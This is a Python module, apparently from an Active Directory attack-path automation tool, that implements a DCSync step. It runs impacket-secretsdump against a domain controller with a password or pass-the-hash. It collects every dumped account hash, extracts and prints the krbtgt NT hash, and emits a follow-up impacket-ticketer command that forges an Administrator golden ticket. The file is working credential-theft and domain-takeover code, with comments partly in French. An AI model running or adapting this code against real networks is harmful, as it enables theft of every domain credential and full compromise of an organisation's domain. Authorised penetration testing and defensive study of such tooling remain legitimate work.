# strategies/dc_sync.py

import subprocess
from dataclasses import dataclass

from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_check, print_done
from references.cred_store import enrich_creds


@dataclass
class DCSyncStrategy(ExploitStrategy):
    edge: Edge

    @property
    def attacker(self) -> Node:
        return self.edge.source_node

    @property
    def target(self) -> Node:
        return self.edge.goal_node

    # ── Interface ExploitStrategy ─────────────────────────────────────────────

    def can_exploit(self) -> bool:
        return self.edge.kind in (EdgeKind.DCSYNC, EdgeKind.GET_CHANGES_ALL)

    def exploit(self, creds: dict) -> ExploitResult:
        creds = {**creds, "username": self.attacker.sam()}
        creds = enrich_creds(creds)

        print_check(
            f"DCSync: {self.attacker.label} ──▶ {self.target.label}"
        )

        return self._run_secretsdump(creds)

    # ── Technique ─────────────────────────────────────────────────────────────

    def _run_secretsdump(self, creds: dict) -> ExploitResult:
        dc_ip    = creds["dc_ip"]
        domain   = creds["domain"]
        username = creds["username"]
        secret   = creds.get("secret", "")
        hashes   = creds.get("hashes")          # LM:NT si PTH

        if hashes:
            target = f"{domain}/{username}@{dc_ip}"
            cmd = ["impacket-secretsdump", target, "-just-dc", "-hashes", hashes]
        else:
            target = f"{domain}/{username}:{secret}@{dc_ip}"
            cmd = ["impacket-secretsdump", target, "-just-dc"]

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output = proc.stdout + proc.stderr
        except subprocess.TimeoutExpired:
            raise HopFailedError(self.edge, "secretsdump timeout (60s)")
        except FileNotFoundError:
            raise HopFailedError(self.edge, "impacket-secretsdump introuvable dans le PATH")

        # Format : DOMAIN\user:RID:LMhash:NThash:::
        all_hashes = [
            line.strip()
            for line in output.splitlines()
            if ":::" in line and not line.startswith("[")
        ]

        krbtgt_line = next(
            (h for h in all_hashes if "krbtgt" in h.lower()), None
        )

        if not krbtgt_line:
            raise HopFailedError(
                self.edge,
                f"secretsdump ran but krbtgt not found — output:\n{output}"
            )

        nt_hash = krbtgt_line.split(":")[3] if krbtgt_line.count(":") >= 3 else ""

        print_done(f"DCSync OK — krbtgt NT hash: {nt_hash}")

        return ExploitResult(
            technique="DCSync (secretsdump -just-dc)",
            edge=self.edge,
            success=True,
            notes=(
                f"Domaine compromis — krbtgt récupéré\n"
                f"  krbtgt hash : {krbtgt_line}\n"
                f"  Total hashes: {len(all_hashes)}"
            ),
            next_command=(
                f"impacket-ticketer -nthash {nt_hash} "
                f"-domain {creds['domain']} "
                f"-domain-sid <SID> Administrator"
            ),
            cleanup_command="# Réinitialiser le mot de passe krbtgt 2× dans l'AD",
            gained_access=Credential(
                username="krbtgt",
                password=None,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )